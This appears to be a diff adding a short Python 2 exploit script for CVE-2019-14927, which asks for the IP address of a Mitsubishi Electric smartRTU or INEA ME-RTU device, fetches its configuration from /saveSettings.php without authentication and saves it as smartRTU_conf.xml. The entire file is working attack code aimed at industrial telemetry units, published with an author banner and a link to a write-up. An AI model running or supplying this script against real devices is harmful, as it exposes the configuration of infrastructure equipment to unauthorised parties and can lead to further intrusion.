@@ -1,0 +1,38 @@
+#!/usr/bin/python
+
+# Exploit Title: Mitsubishi Electric smartRTU & INEA ME-RTU Unauthenticated Configuration Download
+# Date: 29 June 2019 
+# Exploit Author: (@xerubus | mogozobo.com)
+# Vendor Homepage: https://eu3a.mitsubishielectric.com/fa/en/products/cnt/plcccl/items/smartRTU/local
+# Vendor Homepage: http://www.inea.si/en/telemetrija-in-m2m-produkti/mertu-en/
+# Firmware Version: Misubishi Electric 2.02 & INEA 3.0
+# CVE-ID: CVE-2019-14927
+# Full write-up: https://www.mogozobo.com/?p=3593
+
+import sys, os, requests, socket
+
+os.system('clear')
+
+print("""\
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/  -= Conf_Me-smartRTU  by @xerubus =-    
+|   D _]/\ \  -= We all have something to hide =-
+ \___/ / /\ \\
+      (_ )( _)
+      @Xerubus    
+                    """)
+
+host = raw_input("Enter RTU IP address: ")
+	
+php_page = '/saveSettings.php'
+url = "http://{}{}".format(host, php_page)
+
+print "[+] Attempting to download smartRTU configuration file"
+
+r = requests.get(url)
+if r.status_code == 200:
+   print "[+] Successfully obtained smartRTU configuration file.. saving to smartRTU_conf.xml\n"
+   with open('smartRTU_conf.xml', 'w') as f:
+      f.write(r.content)
